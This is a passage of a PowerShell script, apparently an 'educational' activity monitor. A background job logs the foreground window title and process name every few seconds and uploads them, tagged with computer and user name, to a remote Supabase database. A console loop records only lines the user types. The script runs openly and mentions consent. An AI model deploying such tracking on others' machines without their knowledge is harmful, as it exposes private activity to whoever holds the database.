    Write-Host "[INFO] Starting activity monitor..." -ForegroundColor Green
    
    $Global:ActivityMonitorJob = Start-Job -ScriptBlock {
        param($logsFolder, $supabaseUrl, $supabaseKey)
        
        function Send-ActivityToSupabase {
            param($Data)
            try {
                $headers = @{
                    "apikey" = $supabaseKey
                    "Authorization" = "Bearer $supabaseKey"
                    "Content-Type" = "application/json"
                }
                $url = "$supabaseUrl/rest/v1/activity_logs"
                $jsonData = $Data | ConvertTo-Json -Compress
                $response = Invoke-RestMethod -Uri $url -Method POST -Headers $headers -Body $jsonData
                Write-Output "[ACTIVITY] Sent to Supabase: $($Data.process_name) - $($Data.window_title)"
                return $true
            }
            catch {
                Write-Output "[ACTIVITY ERROR] Failed to send to Supabase: $($_.Exception.Message)"
                return $false
            }
        }
        
        function Log-Activity {
            param($ActivityData)
            
            try {
                # Save locally with better error handling
                $timestamp = Get-Date -Format "yyyyMMdd_HHmmss_fff"
                $activityFolder = "$logsFolder\Activity"
                
                # Ensure folder exists
                if (-not (Test-Path $activityFolder)) {
                    New-Item -ItemType Directory -Path $activityFolder -Force | Out-Null
                }
                
                $logFile = "$activityFolder\activity_$timestamp.json"
                $ActivityData | ConvertTo-Json -Depth 3 | Out-File -FilePath $logFile -Encoding UTF8
                Write-Output "[ACTIVITY] Saved locally: $logFile"
                
                # Send to Supabase with retry logic
                $retryCount = 0
                $maxRetries = 3
                $success = $false
                
                while ($retryCount -lt $maxRetries -and -not $success) {
                    $success = Send-ActivityToSupabase -Data $ActivityData
                    if (-not $success) {
                        $retryCount++
                        Start-Sleep -Seconds 2
                    }
                }
                
                if (-not $success) {
                    Write-Output "[ACTIVITY WARNING] Failed to send to Supabase after $maxRetries attempts"
                }
            }
            catch {
                Write-Output "[ACTIVITY ERROR] Error in Log-Activity: $($_.Exception.Message)"
            }
        }
        
        # Activity monitoring loop with improved error handling
        $deviceId = "$env:COMPUTERNAME-$env:USERNAME"
        $lastWindowTitle = ""
        $lastProcessName = ""
        
        Write-Output "[ACTIVITY] Starting monitoring loop for device: $deviceId"
        
        # Define Win32 API once outside the loop
        try {
            Add-Type @"
                using System;
                using System.Runtime.InteropServices;
                using System.Text;
                public class Win32 {
                    [DllImport("user32.dll")]
                    public static extern IntPtr GetForegroundWindow();
                    [DllImport("user32.dll")]
                    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
                    [DllImport("user32.dll")]
                    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
                }
"@
            Write-Output "[ACTIVITY] Win32 API loaded successfully"
        }
        catch {
            Write-Output "[ACTIVITY ERROR] Failed to load Win32 API: $($_.Exception.Message)"
            return
        }
        
        while ($true) {
            try {
                # Get current window information
                $hwnd = [Win32]::GetForegroundWindow()
                
                if ($hwnd -ne [System.IntPtr]::Zero) {
                    $title = New-Object System.Text.StringBuilder(256)
                    $titleLength = [Win32]::GetWindowText($hwnd, $title, 256)
                    
                    $processId = [uint32]0
                    [Win32]::GetWindowThreadProcessId($hwnd, [ref]$processId) | Out-Null
                    
                    if ($processId -gt 0) {
                        $process = Get-Process -Id $processId -ErrorAction SilentlyContinue
                        if ($process) {
                            $currentWindowTitle = $title.ToString().Trim()
                            $currentProcessName = $process.ProcessName
                            
                            # Only log if window or process changed to reduce database spam
                            if ($currentWindowTitle -ne $lastWindowTitle -or $currentProcessName -ne $lastProcessName) {
                                $activityData = @{
                                    device_id = $deviceId
                                    process_name = $currentProcessName
                                    window_title = $currentWindowTitle
                                    window_handle = $hwnd.ToInt64()
                                    timestamp = (Get-Date).ToString("o")
                                }
                                
                                Write-Output "[ACTIVITY] Window changed: $currentProcessName - $currentWindowTitle"
                                Log-Activity -ActivityData $activityData
                                
                                $lastWindowTitle = $currentWindowTitle
                                $lastProcessName = $currentProcessName
                            }
                        }
                    }
                }
                
                Start-Sleep -Seconds 3
            }
            catch {
                Write-Output "[ACTIVITY ERROR] Error in monitoring loop: $($_.Exception.Message)"
                Start-Sleep -Seconds 10
            }
        }
    } -ArgumentList $Global:Config.LogsFolder, $Global:Config.SupabaseUrl, $Global:Config.SupabaseKey
    
    Write-Host "[SUCCESS] Activity monitor started in background" -ForegroundColor Green
    
    # Monitor job output for debugging
    Start-Job -ScriptBlock {
        param($job)
        while ($job.State -eq "Running") {
            $output = Receive-Job -Job $job
            if ($output) {
                Write-Host $output -ForegroundColor Cyan
            }
            Start-Sleep -Seconds 1
        }
    } -ArgumentList $Global:ActivityMonitorJob | Out-Null
}

function Stop-ActivityMonitor {
    if ($Global:ActivityMonitorJob) {
        Stop-Job -Job $Global:ActivityMonitorJob -ErrorAction SilentlyContinue
        Remove-Job -Job $Global:ActivityMonitorJob -ErrorAction SilentlyContinue
        $Global:ActivityMonitorJob = $null
        Write-Host "[INFO] Activity monitor stopped" -ForegroundColor Green
    }
}

function Show-Help {
    Write-Host ""
    Write-Host "Available Commands:" -ForegroundColor Cyan
    Write-Host "- START     : Begin keystroke recording (activity monitor runs automatically)" -ForegroundColor White
    Write-Host "- STOP      : End keystroke recording" -ForegroundColor White
    Write-Host "- STATUS    : Show current monitoring status" -ForegroundColor White
    Write-Host "- DASHBOARD : Open web dashboard in browser" -ForegroundColor White
    Write-Host "- HELP      : Show this help message" -ForegroundColor White
    Write-Host "- QUIT      : Exit the program" -ForegroundColor White
    Write-Host ""
    Write-Host "Features:" -ForegroundColor Green
    Write-Host "- Combined activity and keystroke monitoring" -ForegroundColor White
    Write-Host "- Automatic Supabase database sync" -ForegroundColor White
    Write-Host "- Organized local file storage" -ForegroundColor White
    Write-Host "- Real-time web dashboard" -ForegroundColor White
    Write-Host ""
}

function Open-Dashboard {
    if ($Global:Config.AutoOpenDashboard) {
        $dashboardPath = "$($Global:Config.WebDashboardPath)\index.html"
        if (Test-Path $dashboardPath) {
            Write-Host "[INFO] Opening dashboard in browser..." -ForegroundColor Green
            Start-Process $dashboardPath
        } else {
            Write-Host "[WARNING] Dashboard not found. Creating it now..." -ForegroundColor Yellow
            Create-WebDashboard
            Start-Process $dashboardPath
        }
    }
}

function Check-Timeout {
    if ($Global:IsRecording -and $Global:RecordingStartTime) {
        $elapsed = (Get-Date) - $Global:RecordingStartTime
        if ($elapsed.TotalSeconds -gt $Global:Config.MaxRecordingDuration) {
            Write-Host "`n[TIMEOUT] Auto-stopping keystroke recording after $($Global:Config.MaxRecordingDuration) seconds" -ForegroundColor Yellow
            Stop-KeystrokeRecording
        }
    }
}

function Start-CombinedMonitoring {
    Show-EducationalDisclaimer
    Initialize-Folders
    
    Write-Host "Enhanced Educational Monitor - Combined Mode" -ForegroundColor Cyan
    Write-Host "===========================================" -ForegroundColor Cyan
    
    # Start device info updater
    Start-DeviceInfoUpdater
    
    # Start activity monitor
    Start-ActivityMonitor
    
    # Create and open dashboard
    Open-Dashboard
    
    Show-RecordingStatus
    Show-Help
    
    Write-Host "Ready! Activity and device monitors are running. Type 'START' to begin keystroke recording..." -ForegroundColor Green
    Write-Host ""
    
    # Main input loop
    while ($Global:Running) {
        try {
            Check-Timeout
            
            $promptText = if ($Global:IsRecording) { "Recording> " } else { "Monitor> " }
            Write-Host $promptText -NoNewline -ForegroundColor Cyan
            
            $userInput = Read-Host
            
            if ($userInput -ne $null) {
                $command = $userInput.Trim().ToUpper()
                
                switch ($command) {
                    "START" {
                        if (-not $Global:IsRecording) {
                            Start-KeystrokeRecording
                        } else {
                            Write-Host "Keystroke recording is already active." -ForegroundColor Yellow
                        }
                    }
                    
                    "STOP" {
                        if ($Global:IsRecording) {
                            Stop-KeystrokeRecording
                        } else {
                            Write-Host "No active keystroke recording session." -ForegroundColor Yellow
                        }
                    }
                    
                    "DASHBOARD" {
                        Open-Dashboard
                    }
                    
                    "HELP" {
                        Show-Help
                    }
                    
                    "STATUS" {
                        Show-RecordingStatus
                    }
                    
                    "QUIT" {
                        if ($Global:IsRecording) {
                            Stop-KeystrokeRecording
                        }
                        Stop-ActivityMonitor
                        Stop-DeviceInfoUpdater
                        $Global:Running = $false
                    }
                    
                    "" {
                        Write-Host "Type: START, STOP, DASHBOARD, STATUS, HELP, or QUIT" -ForegroundColor Yellow
                    }
                    
                    default {
                        if ($Global:IsRecording) {
                            $timestamp = Get-Date -Format "HH:mm:ss"
                            $Global:KeystrokeBuffer += "[$timestamp] $userInput`n"
                            Write-Host "Captured: $userInput" -ForegroundColor Green
                        } else {
                            Write-Host "Unknown command: '$command'" -ForegroundColor Red
                            Write-Host "Type HELP for available commands" -ForegroundColor Cyan
                        }
                    }
                }
            }
        }
        catch [System.Management.Automation.PipelineStoppedException] {
            Write-Host "`n[INFO] Monitoring stopped by user." -ForegroundColor Yellow
            break
        }
        catch {
            Write-Host "[ERROR] An error occurred: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    
    Write-Host "`n[SUCCESS] Enhanced Educational Monitor ended." -ForegroundColor Green
}

function Show-Usage {
    Write-Host "Enhanced Educational System Monitor - Usage:" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Combined Monitoring (Recommended):" -ForegroundColor Yellow
    Write-Host "  .\EnhancedCombinedMonitor.ps1 -StartMonitoring" -ForegroundColor White
    Write-Host "  (Runs activity monitor + user-controlled keystroke recording + web dashboard)" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Create Dashboard Only:" -ForegroundColor Yellow
    Write-Host "  .\EnhancedCombinedMonitor.ps1 -CreateDashboard" -ForegroundColor White
    Write-Host "  (Creates and opens the web dashboard)" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Enhanced Features:" -ForegroundColor Green
    Write-Host "• Real-time activity monitoring with 5-second intervals" -ForegroundColor White
    Write-Host "• User-controlled keystroke recording with consent" -ForegroundColor White
    Write-Host "• Automatic Supabase database synchronization" -ForegroundColor White
    Write-Host "• Organized local file storage in Logs folder" -ForegroundColor White
    Write-Host "• Real-time web dashboard with auto-refresh" -ForegroundColor White
    Write-Host "• Automatic browser opening for dashboard" -ForegroundColor White
    Write-Host ""
    Write-Host "Configuration:" -ForegroundColor Cyan
    Write-Host "• Update Supabase URL and Key in the script configuration" -ForegroundColor White
    Write-Host "• Logs are saved to: $($Global:Config.LogsFolder)" -ForegroundColor White
    Write-Host "• Dashboard is created in: $($Global:Config.WebDashboardPath)" -ForegroundColor White
    Write-Host ""
}

# Main execution
switch ($true) {
    $StartMonitoring {
        Start-CombinedMonitoring
    }
    
    $CreateDashboard {
        Initialize-Folders
        Create-WebDashboard
        Open-Dashboard
    }
    
    default {
        Show-Usage
        
        $choice = Read-Host "What would you like to do? (1=Start Combined Monitoring, 2=Create Dashboard Only, 3=Exit)"
        switch ($choice) {
            "1" { Start-CombinedMonitoring }
            "2" { 
                Initialize-Folders
                Create-WebDashboard
                Open-Dashboard
            }
            "3" { Write-Host "Goodbye!" -ForegroundColor Green }
            default { Write-Host "Invalid choice." -ForegroundColor Red }
        }
    }
}